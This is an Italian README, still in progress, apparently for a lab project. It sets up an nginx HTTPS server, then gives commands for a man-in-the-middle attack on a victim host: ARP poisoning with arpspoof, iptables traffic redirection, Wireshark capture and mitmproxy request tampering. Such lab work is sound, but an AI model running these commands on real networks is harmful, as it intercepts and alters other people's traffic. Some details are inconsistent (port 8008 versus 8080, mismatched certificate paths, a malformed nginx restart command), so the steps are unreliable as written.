# File README in fase di scrittura

## Configurazione del server 

### Installazione e configurazione di nginx 
```
sudo apt install nginx -y
sudo systemctl status nginx
sudo mkdir -p /etc/nginx/ssl

sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \ -keyout /etc/nginx/ssl/nginx-selfsigned.key \ -out /etc/nginx/ssl/nginx-selfsigned.crt

cd /etc/nginx/sites-available/

sudo nano /etc/nginx/sites-available/default
```

```
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        server_name 192.168.1.200;

        # Redirect HTTP a HTTPS
        return 301 https://$host$request_uri;
}

server {
    listen 443 ssl;
    server_name 192.168.1.200;

    ssl_certificate /etc/nginx/ssl/nginx.crt;
    ssl_certificate_key /etc/nginx/ssl/nginx.key;

    location / {
        proxy_pass http://localhost:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

```
sudo nginx -t
sudo restart nginx
```


Clona la repository
```
git clone https://github.com/SenapeDev/CySec.git
cd server
docker compose up --build -d
```

```
make https-on
make https-off
```

## Configurazione del client MITM
### Attivare il forwarding dei pacchetti 
```
sudo su
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### Effettuare ARP Poisoning
```
sudo su
arpspoof -i enp4s0 -t 192.168.1.18 192.168.1.200
```

### Modificare tabelle di routing
In questo modo, tutto il traffico proveniente dalla vittima e inviato all'attaccante sulla porta 80, verrà redirezionato sulla porta 8008, accessibile a mitmproxy
```
sudo iptables -t nat -A PREROUTING -p tcp -s 192.168.1.18 --dport 80 -j REDIRECT --to-port 8080

sudo iptables -t nat -L -v -n
sudo iptables -t nat -D PREROUTING 1
```

### Intercettare pacchetti con Wireshark
```
sudo wireshark
```

### Modificare le richieste inviate dal client
```
mitmproxy -s main.py --mode transparent
```